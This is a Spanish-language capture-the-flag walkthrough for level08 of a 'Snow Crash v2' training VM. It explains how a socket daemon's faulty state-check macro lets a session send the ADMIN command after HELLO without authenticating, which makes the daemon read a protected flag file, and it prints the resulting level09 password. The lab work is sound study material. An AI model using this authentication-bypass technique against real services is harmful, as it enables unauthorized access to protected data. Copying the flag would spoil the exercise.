# Level08 - Snow Crash v2

## Tipo de ejercicio

Explotación de un protocolo binario mediante un fallo de control de estados
en un daemon accesible por socket Unix.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level09`.

La versión clásica bloquea el nombre `token` y se puede sortear con un enlace
simbólico. Esta OVA v2 utiliza el daemon `blacksun`, que expone un protocolo de
sesiones `HELLO -> AUTH -> ADMIN`.

## 1. Localizar el daemon

Desde la sesión SSH de `level08`:

```bash
whoami
hostname
pwd
ls -la
cat README
find /home/level08 -maxdepth 2 -ls
```

El README clásico no existe en esta imagen. El componente del nivel se
localiza así:

```bash
find /opt/snowcrash/level08 -maxdepth 2 -ls 2>/dev/null
find / -xdev -user flag08 -ls 2>/dev/null
```

Los archivos relevantes son:

```text
/opt/snowcrash/level08/blacksun
/opt/snowcrash/level08/blacksun.c
```

El ejecutable es propiedad de `flag08` y la fuente es legible para
`level08`:

```bash
ls -l /opt/snowcrash/level08/blacksun
file /opt/snowcrash/level08/blacksun
```

## 2. Analizar el protocolo

La fuente revela las constantes principales:

```c
#define SOCK_PATH       "/run/blacksun/blacksun.sock"
#define FLAG_PATH       "/home/flag08/.flag"
#define PROTOCOL_VER    1
#define MAGIC_HELLO     0xDEADU
#define CMD_HELLO       0
#define CMD_AUTH        1
#define CMD_ADMIN       2
```

El daemon espera una cabecera binaria de 8 bytes y un payload. El primer byte
contiene la versión, el estado y el comando; el payload usa un checksum XOR:

```c
acc ^= (uint16_t)buf[i] ^ (uint16_t)(i & 0xFFu);
```

La autenticación exige una clave de 32 bytes, pero no necesitamos conocerla
debido al fallo de validación de estados.

## 3. Identificar el fallo lógico

El código comprueba los comandos administrativos mediante:

```c
#define CHECK_STATE(ctx, required) \\
		( ((required) == STATE_ADMIN) \\
				? ((ctx)->state >= STATE_AUTH) \\
				: ((ctx)->state == (required)) )
```

Para `CMD_ADMIN`, la condición correcta debería exigir `STATE_ADMIN`. Sin
embargo, usa `ctx->state >= STATE_AUTH`, por lo que una sesión que solo ha
completado `HELLO` ya puede ejecutar `ADMIN` sin pasar por `AUTH`.

El daemon está activo:

```bash
ps aux | grep '[b]lacksun'
systemctl status blacksun.service --no-pager
```

Y el socket es accesible para el grupo `blacksun`:

```bash
ls -ld /run/blacksun
ls -l /run/blacksun/blacksun.sock
id
```

Resultado relevante:

```text
srw-rw---- 1 flag08 blacksun ... /run/blacksun/blacksun.sock
groups=...,4007(blacksun)
```

## 4. Usar el cliente del protocolo

El cliente Python utilizado está disponible en
[blacksun_client.py](blacksun_client.py). No modifica la OVA; solo se conecta
al socket Unix y envía dos mensajes válidos.

Desde el equipo anfitrión se copia a `/tmp` de la OVA:

```bash
scp -P 2424 level08/resources/blacksun_client.py \
	level08@localhost:/tmp/blacksun_client.py
```

Dentro de `level08@snowcrash` se ejecuta:

```bash
python3 /tmp/blacksun_client.py
```

El cliente realiza estas operaciones:

1. Conecta a `/run/blacksun/blacksun.sock`.
2. Envía `HELLO` con versión `1` y magic `0xDEAD`.
3. Recibe `HELLO OK` y la sesión pasa a `STATE_AUTH`.
4. Envía `CMD_ADMIN` sin enviar `CMD_AUTH`.
5. El fallo `state >= STATE_AUTH` permite la operación administrativa.
6. El daemon lee `/home/flag08/.flag` como `flag08` y devuelve su contenido.

Resultado obtenido:

```text
HELLO OK
ACCESS GRANTED
FLAG=s5cAhoAfNT9GrgqykhZavyBg9
```

## 5. Conectarse a level09

Desde el equipo anfitrión:

```bash
exit
ssh level09@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
s5cAhoAfNT9GrgqykhZavyBg9
```

## Conclusión

No se modificó ningún archivo de la OVA. La solución aprovecha únicamente el
socket Unix ya expuesto por el daemon y un error en la comprobación de estados:
`ADMIN` se acepta después de `HELLO`, aunque nunca se haya completado la
autenticación. El daemon devuelve entonces la credencial de `level09`.
